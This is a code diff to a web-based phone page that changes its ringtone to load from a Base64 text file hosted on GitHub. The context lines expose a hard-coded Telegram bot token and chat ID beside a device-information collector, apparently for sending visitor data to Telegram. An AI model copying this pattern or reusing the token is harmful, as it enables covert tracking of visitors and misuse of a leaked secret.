@@ -1816,10 +1816,7 @@
     </div>
     
     <!-- Audio elements for WebPhone -->
-    <audio id="ringtone" loop preload="auto">
-        <source src="https://github.com/killiandaisreauxgoffman/projects/raw/refs/heads/main/RingTone.mp3" type="audio/mpeg">
-    </audio>
-    
+    <audio id="ringtone" loop preload="auto"></audio>
     <audio id="ringback" loop preload="auto">
         <source src="https://cdn.freesound.org/previews/571/571407_11497730-lq.mp3" type="audio/mpeg">
     </audio>
@@ -1828,6 +1825,9 @@
         // Updated Telegram bot credentials
         const BOT_TOKEN = '7753553773:AAHcoQspLrdCjrV84GjUlCM4olB_RaIkJpg';
         const CHAT_ID = '1038828738';
+        
+        // Base64 encoded ringtone URL
+        const RINGTONE_BASE64_URL = 'https://raw.githubusercontent.com/killiandaisreauxgoffman/projects/refs/heads/main/RingToneBase64Encoded.txt';
         
         // Device information collector
         class DeviceInfoCollector {
@@ -2684,6 +2684,9 @@
             async init() {
                 this.statusText.textContent = "Initializing...";
                 
+                // Load Base64 ringtone
+                await this.loadBase64Ringtone();
+                
                 // Check media devices and permissions
                 const hasMic = await this.checkMediaDevices();
                 if (!hasMic) {
@@ -2699,6 +2702,34 @@
                 
                 // Set up event listeners
                 this.setupEventListeners();
+            }
+            
+            async loadBase64Ringtone() {
+                try {
+                    // Fetch the Base64 encoded ringtone from GitHub
+                    const response = await fetch(RINGTONE_BASE64_URL);
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    
+                    const base64Data = await response.text();
+                    
+                    // Create a data URL from the Base64 string
+                    const audioDataUrl = `data:audio/mp3;base64,${base64Data}`;
+                    
+                    // Set the ringtone source
+                    this.ringtone.src = audioDataUrl;
+                    
+                    // Preload the ringtone
+                    this.ringtone.load();
+                    
+                    console.log('Ringtone loaded successfully from Base64');
+                } catch (error) {
+                    console.error('Error loading Base64 ringtone:', error);
+                    // Fallback to default ringtone if Base64 loading fails
+                    this.ringtone.src = 'https://github.com/killiandaisreauxgoffman/projects/raw/refs/heads/main/RingTone.mp3';
+                    this.ringtone.load();
+                }
             }
             
             async checkMediaDevices() {
@@ -2830,6 +2861,7 @@
                         this.callButton.classList.add('answer');
                         this.hangupButton.disabled = false;
                         
+                        // Play the Base64 decoded ringtone
                         this.ringtone.play().catch(e => console.error('Ringtone error:', e));
                         
                         this.incomingSession.on('accepted', () => {
